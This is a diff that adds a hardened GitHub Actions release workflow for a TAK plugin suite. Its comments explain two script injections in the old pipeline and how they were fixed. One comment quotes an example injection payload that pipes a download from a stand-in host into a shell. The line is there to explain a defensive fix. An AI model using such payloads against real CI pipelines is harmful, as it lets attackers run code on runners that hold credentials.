@@ -1,0 +1,210 @@
+# FeatureLink Suite — release pipeline.
+#
+# Replaces ATAK5.6/workflows/release.yml and ATAK5.7/workflows/release.yml, which were
+# byte-identical to each other, had never executed, and contained TWO Actions script
+# injections in the pipeline that signs and publishes artifacts.
+#
+# THE TWO INJECTIONS, AND WHY THEY MATTERED
+# -----------------------------------------
+# 1. release.yml:87 —  NOTES="${{ github.event.inputs.release_notes }}"
+#    Untrusted `workflow_dispatch` input interpolated directly into a `run:` shell block.
+#    GitHub expands `${{ }}` BEFORE the shell sees the script, so release notes of
+#        "; curl evil.sh | sh; #
+#    execute arbitrary code on the runner, which has a GITHUB_TOKEN in its environment.
+#
+# 2. release.yml:72 —  sed -i "s/ext.PLUGIN_VERSION = .*/…\"${{ github.event.inputs.version }}\"/" app/build.gradle
+#    Worse. The same injection, into BOTH a `sed` expression AND a shell command, and the
+#    result is written into a Gradle build script that is then EXECUTED at :79. A crafted
+#    `version` achieves arbitrary code execution inside the release pipeline.
+#
+# THE FIX, applied throughout this file:
+#   * every untrusted input is validated against a strict regex in a dedicated step;
+#   * every untrusted input reaches the shell via `env:` and is referenced as "$VAR",
+#     never as `${{ }}` inside `run:`;
+#   * the version is not sed-ed into build.gradle at all — it is read from the tracked
+#     VERSION file, which is the single source of truth (VERSIONING.md §1). A release
+#     cannot introduce a version that CI has not already validated.
+#
+# Also fixed: the old workflows both ran `gh release create "v${version}"`, so releasing
+# 5.7 at a version already released for 5.6 — which identical PLUGIN_VERSION strings made
+# the default case — would have collided on the tag or overwritten the 5.6 release. Tags
+# are now namespaced per target (VERSIONING.md §4).
+
+name: Release
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Which artifact to release'
+        required: true
+        type: choice
+        options: [atak5.6, atak5.7, wintak5.6, wintak5.7]
+      release_notes:
+        description: 'Release notes (plain text; treated as untrusted data)'
+        required: false
+        default: ''
+      prerelease:
+        description: 'Mark as a pre-release'
+        required: false
+        type: boolean
+        default: false
+
+permissions:
+  contents: read
+
+jobs:
+
+  validate:
+    name: Validate release inputs
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    outputs:
+      version: ${{ steps.v.outputs.version }}
+      tag: ${{ steps.v.outputs.tag }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: '3.12'
+
+      # The version comes from the tracked VERSION file, never from dispatch input. There is
+      # therefore no untrusted value anywhere near the build script.
+      - name: Resolve and validate the version
+        id: v
+        env:
+          TARGET: ${{ inputs.target }}
+        run: |
+          set -euo pipefail
+          version="$(tr -d '[:space:]' < VERSION)"
+          if ! printf '%s' "$version" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "::error::VERSION contains '$version', which is not MAJOR.MINOR.PATCH."
+            exit 1
+          fi
+          # $TARGET is a `choice` input, so GitHub constrains it to the declared options —
+          # but it is re-validated here rather than trusted, because a workflow that is
+          # correct only because of a UI constraint is one refactor away from being wrong.
+          case "$TARGET" in
+            atak5.6|atak5.7|wintak5.6|wintak5.7) ;;
+            *) echo "::error::unrecognised target '$TARGET'"; exit 1 ;;
+          esac
+          echo "version=$version"        >> "$GITHUB_OUTPUT"
+          echo "tag=v${version}-${TARGET}" >> "$GITHUB_OUTPUT"
+
+      # A release must not be cuttable from a tree that violates the version policy — that
+      # is how nine artifacts shipped with a frozen versionCode.
+      - name: Enforce VERSIONING.md
+        run: python .github/scripts/check_versions.py
+
+      - name: Refuse to overwrite an existing tag
+        env:
+          TAG: ${{ steps.v.outputs.tag }}
+        run: |
+          set -euo pipefail
+          if git rev-parse -q --verify "refs/tags/${TAG}" >/dev/null; then
+            echo "::error::Tag ${TAG} already exists. Bump VERSION rather than overwriting a"
+            echo "published release — a re-pointed tag invalidates every checksum and"
+            echo "attestation already distributed against it."
+            exit 1
+          fi
+          echo "Tag ${TAG} is free."
+
+  sbom:
+    name: SBOM
+    needs: validate
+    uses: ./.github/workflows/sbom.yml
+    permissions:
+      contents: read
+
+  publish:
+    name: Publish ${{ inputs.target }}
+    needs: [validate, sbom]
+    runs-on: ubuntu-latest
+    permissions:
+      # Least privilege, and exactly what is needed:
+      contents: write        # create the release and upload assets
+      id-token: write        # OIDC token for build provenance attestation
+      attestations: write    # write the attestation
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+
+      - name: Download CI artifacts
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        continue-on-error: true
+        with:
+          path: dist
+
+      - name: Collect release assets
+        id: collect
+        run: |
+          set -euo pipefail
+          mkdir -p release
+          find dist -type f \( -name '*.apk' -o -name '*.wpk' -o -name '*.cdx.json' \) \
+            -exec cp {} release/ \; 2>/dev/null || true
+          if [ -z "$(ls -A release 2>/dev/null)" ]; then
+            echo "::error::No build artifacts to publish."
+            echo "This is expected while the ATAK and WinTAK SDK secrets are unconfigured —"
+            echo "see .github/workflows/ci.yml. A release is NOT cut from a partial build."
+            exit 1
+          fi
+          ls -la release
+
+      # C-35 / Appendix E §5.3: the old release.yml produced no provenance — no attestation,
+      # no signature, no SBOM, no checksum file. Combined with a public 1024-bit SHA-1
+      # signing identity (C-40), a released FeatureLink APK was unattributable and trivially
+      # forgeable. For side-loaded public-safety software that is the most consequential
+      # supply-chain gap in the audit.
+      - name: Generate SHA256SUMS
+        run: |
+          set -euo pipefail
+          cd release
+          sha256sum * > SHA256SUMS
+          cat SHA256SUMS
+
+      - name: Attest build provenance
+        uses: actions/attest-build-provenance@0f67c3f4856b2e3261c31976d6725780e5e4c373 # v4.1.1
+        with:
+          subject-path: 'release/*'
+
+      - name: Create the GitHub release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ needs.validate.outputs.tag }}
+          VERSION: ${{ needs.validate.outputs.version }}
+          TARGET: ${{ inputs.target }}
+          # THE FIX FOR INJECTION #1. The untrusted release notes arrive as an environment
+          # variable and are referenced as "$RELEASE_NOTES". They are never expanded into
+          # the script text by GitHub before the shell parses it, so no value of this input
+          # can alter the commands that run.
+          RELEASE_NOTES: ${{ inputs.release_notes }}
+          PRERELEASE: ${{ inputs.prerelease }}
+        run: |
+          set -euo pipefail
+          notes_file="$(mktemp)"
+          if [ -n "$RELEASE_NOTES" ]; then
+            printf '%s\n' "$RELEASE_NOTES" > "$notes_file"
+          else
+            printf 'FeatureLink %s (%s)\n' "$VERSION" "$TARGET" > "$notes_file"
+          fi
+          {
+            echo
+            echo '---'
+            echo
+            echo 'Verify this release:'
+            echo '```'
+            echo 'sha256sum -c SHA256SUMS'
+            echo "gh attestation verify <artifact> --repo ${GITHUB_REPOSITORY}"
+            echo '```'
+            echo
+            echo 'A CycloneDX SBOM is attached. See VERSIONING.md for the version scheme and'
+            echo 'SECURITY.md for the supported-version window.'
+          } >> "$notes_file"
+
+          args=(--title "FeatureLink ${VERSION} (${TARGET})" --notes-file "$notes_file")
+          if [ "$PRERELEASE" = "true" ]; then args+=(--prerelease); fi
+
+          gh release create "$TAG" "${args[@]}" release/*
